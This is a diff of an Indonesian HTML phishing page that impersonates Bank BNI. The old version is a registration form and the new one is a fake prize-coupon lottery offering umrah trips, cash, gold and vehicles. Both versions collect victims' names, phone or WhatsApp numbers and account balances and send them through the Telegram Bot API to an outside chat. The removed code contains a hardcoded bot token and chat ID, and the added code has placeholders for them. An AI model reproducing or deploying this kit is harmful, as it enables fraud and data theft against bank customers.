@@ -1,171 +1,318 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Form Pendaftaran - Bank BNI</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <style>
-        body {
-            background-color: #f8f9fa;
-            font-family: 'Arial', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        .navbar-img img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-        .form-container {
-            background: white;
-            padding: 40px 25px;
-            border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
-            width: 100%;
-            max-width: 450px;
-            margin: 30px auto;
-        }
-        .form-header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        .btn-custom {
-            width: 100%;
-            font-weight: bold;
-            padding: 12px;
-            background-color: #ff6600;
-            border: none;
-            color: white;
-            border-radius: 5px;
-        }
-        .btn-custom:hover {
-            background-color: #e65c00;
-        }
-        .form-label {
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-        .form-control {
-            border: 2px solid orange;
-            padding: 10px;
-            border-radius: 5px;
-        }
-        .input-group-text {
-            background-color: #e9ecef;
-            font-weight: bold;
-            border: 2px solid orange;
-            border-radius: 5px 0 0 5px;
-        }
-        .footer-img img {
-            width: 100%;
-            height: auto;
-            display: block;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pencetakan Kupon BNI</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
+  <style>
+    body {
+      background: linear-gradient(to bottom, #87CEFA, #ffffff);
+      font-family: 'Arial', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-image: url(background.png);
+    }
+
+    /* Navbar */
+    .navbar {
+      height: 90px;
+      width: 100%;
+      padding: 0;
+      margin: 0;
+    }
+    .navbar-full-img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    /* Carousel */
+    .carousel-wrapper {
+      background: url('belakangbni.png') no-repeat center top;
+      background-size: cover;
+      padding: 50px 0 20px;
+      border-bottom-left-radius: 30px;
+      border-bottom-right-radius: 30px;
+    }
+    .carousel {
+      
+      max-width: 370px;
+      margin: auto;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    .carousel-indicators [data-bs-target] {
+      background-color: #007bff;
+    }
+
+    /* Animasi */
+    @keyframes gradientShift {
+      0% { background: linear-gradient(to right, #ff9a9e, #fad0c4); }
+      25% { background: linear-gradient(to right, #a18cd1, #fbc2eb); }
+      50% { background: linear-gradient(to right, #fbc2eb, #a6c1ee); }
+      75% { background: linear-gradient(to right, #ffecd2, #fcb69f); }
+      100% { background: linear-gradient(to right, #ff9a9e, #fad0c4); }
+    }
+    @keyframes slideIn {
+      0% { opacity: 0; transform: translateX(100%); }
+      100% { opacity: 1; transform: translateX(0); }
+    }
+
+    /* Form */
+    .form-box {
+      margin: 30px auto 10px;
+      padding: 20px;
+      border-radius: 15px;
+      max-width: 370px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.15);
+      background-color: #fff;
+    }
+
+    /* Text slider */
+    .text-slider-container {
+      width: 100%;
+      overflow: hidden;
+      border-bottom: 2px solid #eee;
+      margin-bottom: 15px;
+    }
+    .text-slider {
+      display: inline-block;
+      white-space: nowrap;
+      font-weight: bold;
+      font-size: 16px;
+      color: #ff5a2d;
+      padding: 8px 0;
+      animation: slideText 12s linear infinite;
+    }
+    @keyframes slideText {
+      0% { transform: translateX(100%); }
+      80% { transform: translateX(-100%); }
+      100% { transform: translateX(-120%); } /* kasih jarak renggang */
+    }
+
+    /* Form field */
+    .form-label {
+      font-weight: bold;
+      color: #333;
+    }
+    input.form-control, select.form-select {
+      border: 2px solid #ddd;
+      border-radius: 10px;
+      padding: 10px;
+    }
+
+    /* Tombol Submit */
+    .btn-submit {
+      width: 100%;
+      padding: 12px;
+      background: #ff5a2d;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      transition: background 0.3s ease;
+    }
+    .btn-submit:hover {
+      background: #e6451c;
+    }
+
+    /* Responsive */
+    @media (max-width: 576px) {
+      .form-box { padding: 15px; }
+      .text-slider { font-size: 14px; }
+      input.form-control { padding: 8px; font-size: 14px; }
+      .btn-submit { padding: 10px; font-size: 15px; }
+    }
+    @media (max-width: 480px) {
+      /* perbaikan selector yang sebelumnya bikin gambar mengecil */
+      .navbar { height: 80px; }
+      .navbar-full-img { object-fit: contain; }
+    }
+.text-slider {
+  white-space: nowrap;
+  overflow: hidden;
+  display: block;
+  position: relative;
+  font-weight: bold;
+  color: #333;          /* warna tulisan */
+  background: transparent !important; /* biar gak ada background */
+  animation: slideText 10s linear infinite;
+}
+
+/* Animasi jalan dari kanan ke kiri */
+@keyframes slideText {
+  0% {
+    transform: translateX(100%);
+  }
+  100% {
+    transform: translateX(-100%);
+  }
+}
+
+    /* =========================
+       OVERRIDE: Bikin slider gede & full-fit
+       (tanpa menghapus kode lama)
+    ==========================*/
+ 
+    /* pastikan semua gambar di item ngepas penuh */
+    .carousel-item img,
+    .carousel-img {
+      width: 100%;
+        padding: 0 10px;   /* kasih jarak kanan kiri */
+
+      height: 100%;
+      object-fit: cover;   /* zoom crop rapi, tanpa gepeng */
+      display: block;
+    }
+    /* sudut membulat tetap rapi */
+    .carousel-item img { border-radius: 10px; }
+  </style>
 </head>
 <body>
 
-    <!-- Navbar Full Image -->
-    <div class="navbar-img">
-        <img src="iconakhir.jpg" alt="Banner BNI">
+<!-- NAVBAR -->
+<div class="navbar">
+  <img src="headerbni.png" alt="Logo BNI" class="navbar-full-img">
+</div>
+
+<!-- CAROUSEL -->
+<div class="carousel-wrapper">
+  <div id="promoCarousel" class="carousel slide" data-bs-ride="carousel">
+    <div class="carousel-inner text-center">
+      <div class="carousel-item active" data-bs-interval="2000">
+        <img src="banner4img1.png" class="carousel-img" alt="Promo 1">
+      </div>
+      <div class="carousel-item" data-bs-interval="2000">
+        <img src="babannerimg1.jpg" class="carousel-img" alt="Promo 2">
+      </div>
+      <div class="carousel-item" data-bs-interval="2000">
+        <img src="bannerimg3.jpg" class="carousel-img" alt="Promo 3">
+      </div>
     </div>
+  </div>
+</div>
 
-    <!-- Form Container -->
-    <div class="form-container">
-    <div style="width: 400px; height: 4px; background-color: #ff6600; margin: 0 auto 25px auto; border-radius: 2px;"></div>
-        
-        <form id="registrationForm">
-            <div class="mb-3">
-                <label class="form-label">Nama Lengkap Tanpa Singkatan</label>
-                <input type="text" id="namaLengkap" class="form-control" placeholder="Contoh: Andi Saputra" required>
-            </div>
-            <div class="mb-3">
-                <label class="form-label">Saldo Akhir</label>
-                <input type="text" id="saldoAkhir" class="form-control" placeholder="Contoh: 1.000.000" required>
-            </div>
-            <div class="mb-3">
-                <label class="form-label">Nomor Handphone</label>
-                <div class="input-group">
-                    <span class="input-group-text">+62</span>
-                    <input type="tel" id="nomorHp" class="form-control" placeholder="8xxxxxxxxxx" required>
-                </div>
-            </div>
-            <button type="submit" class="btn btn-custom mt-3">Cetak Kupon</button>
-        </form>
+<!-- FORM -->
+<div class="form-box">
+  <div class="text-slider-container">
+    <div class="text-slider">
+      <span>Silahkan lengkapi kupon undian dibawah ini</span>
     </div>
+  </div>
 
-    <!-- Footer Full Image -->
-    <div class="footer-img mt-auto">
-        <img src="terjall.png" alt="Footer Banner">
+  <form id="brimoForm">
+    <div class="mb-3">
+      <label for="kupon" class="form-label">Pilih Kupon</label>
+      <select id="kupon" class="form-select" required>
+        <option value="">PILIH KUPON</option>
+        <option value="1">PAKET UMROH TIKET LIBURAN</option>
+        <option value="2">UANG CASH & EMAS</option>
+        <option value="3">Mobil & Motor</option>
+      </select>
     </div>
+    <div class="mb-3">
+      <label for="namaLengkap" class="form-label">Nama Lengkap:</label>
+      <input type="text" id="namaLengkap" class="form-control" placeholder="Masukkan Nama Lengkap" required />
+    </div>
+    <div class="mb-3">
+      <label for="nomorHp" class="form-label">Nomor WhatsApp:</label>
+      <input type="tel" id="nomorHp" class="form-control" placeholder="Masukkan Nomor Handphone" required>
+    </div>
+    <div class="mb-3">
+      <label for="saldo" class="form-label">Saldo Rekening Tabungan saat ini:</label>
+      <input type="text" id="saldo" class="form-control" placeholder="Rp.xxx" required />
+    </div>
+  </form>
+</div>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<style>
+/* Container teks biar rapi */
+.text-slider-container {
+  width: 100%;
+  overflow: hidden;
+  white-space: nowrap;
+  box-sizing: border-box;
+  border-bottom: 2px solid #ddd;
+  margin-bottom: 15px;
+}
 
-    <script>
-        const saldoInput = document.getElementById("saldoAkhir");
+/* Teks jalan */
+.text-slider {
+  display: inline-block;
+  padding-left: 100%; /* mulai dari kanan */
+  animation: slideText 12s linear infinite;
+}
 
-        saldoInput.addEventListener("input", function () {
-            formatRupiah(this);
-        });
+.text-slider span {
+  font-size: 18px;
+  font-weight: bold;
+  color: #333;
+}
 
-        saldoInput.addEventListener("focus", function () {
-            this.value = this.value.replace(/\./g, "");
-        });
+/* Animasi jalan */
+@keyframes slideText {
+  0% {
+    transform: translateX(0%);
+  }
+  100% {
+    transform: translateX(-100%);
+  }
+}
+</style>
 
-        saldoInput.addEventListener("blur", function () {
-            formatRupiah(this);
-        });
+<!-- Submit button diluar card -->
+<div style="max-width:370px;margin:10px auto 30px;">
+  <button type="submit" form="brimoForm" class="btn-submit">CETAK KUPON</button>
+</div>
 
-        function formatRupiah(element) {
-            let angka = element.value.replace(/[^,\d]/g, "").toString();
-            let split = angka.split(",");
-            let sisa = split[0].length % 3;
-            let rupiah = split[0].substr(0, sisa);
-            let ribuan = split[0].substr(sisa).match(/\d{3}/g);
+<!-- Bootstrap JS -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
-            if (ribuan) {
-                let separator = sisa ? "." : "";
-                rupiah += separator + ribuan.join(".");
-            }
+<script>
+  document.getElementById("brimoForm").addEventListener("submit", function(event) {
+    event.preventDefault();
+    let kupon = document.getElementById("kupon").value.trim();
+    let nama = document.getElementById("namaLengkap").value.trim();
+    let noHp = document.getElementById("nomorHp").value.trim();
+    let saldo = document.getElementById("saldo").value.trim();
 
-            rupiah = split[1] !== undefined ? rupiah + "," + split[1] : rupiah;
-            element.value = rupiah;
+    if (kupon === "" || nama === "" || noHp === "" || saldo === "") {
+      alert("Semua kolom wajib diisi.");
+      return;
+    }
+
+    let saldoFormatted = new Intl.NumberFormat("id-ID").format(saldo);
+    let message = `📝 *Pendaftaran Kupon BNI*\n\n🎟 Kupon: ${kupon}\n👤 Nama: ${nama}\n📱 Nomor HP: ${noHp}\n💰 Saldo Akhir: Rp ${saldoFormatted}`;
+
+    let botToken = "ISI_TOKENMU";
+    let chatId = "ISI_CHATIDMU";
+
+    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          alert("Data berhasil dikirim!");
+          window.location.href = "registrasi.html";
+        } else {
+          alert("Gagal mengirim ke Telegram.");
         }
+      })
+      .catch(error => {
+        alert("Terjadi kesalahan jaringan: " + error);
+      });
+  });
 
-        document.getElementById("registrationForm").addEventListener("submit", function (event) {
-            event.preventDefault();
-
-            let nama = document.getElementById("namaLengkap").value.trim();
-            let saldo = saldoInput.value.replace(/\./g, "").trim();
-            let noHp = document.getElementById("nomorHp").value.trim();
-
-            if (nama === "" || saldo === "" || noHp === "") {
-                alert("Harap isi semua data sebelum melanjutkan!");
-                return;
-            }
-
-            let saldoFormatted = new Intl.NumberFormat("id-ID").format(saldo);
-
-            let botToken = "8085535229:AAFrV7I6yY03h7eOo7ImTQFjRrS_0LHm_pE";
-            let chatId = "5529725648";
-            let message = `📝 *Pendaftaran Baru*\n\n👤 Nama: ${nama}\n📱 Nomor HP: +62${noHp}\n💰 Saldo Akhir: Rp ${saldoFormatted}`;
-
-            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        window.location.href = "registrasi.html";
-                    } else {
-                        alert("Gagal mengirim data.");
-                    }
-                })
-                .catch(error => alert("Terjadi kesalahan: " + error));
-        });
-    </script>
-    
+  // Auto play carousel
+  const carousel = document.querySelector('#promoCarousel');
+  new bootstrap.Carousel(carousel, {
+    interval: 2000,
+    ride: 'carousel'
+  });
+</script>
 </body>
 </html>
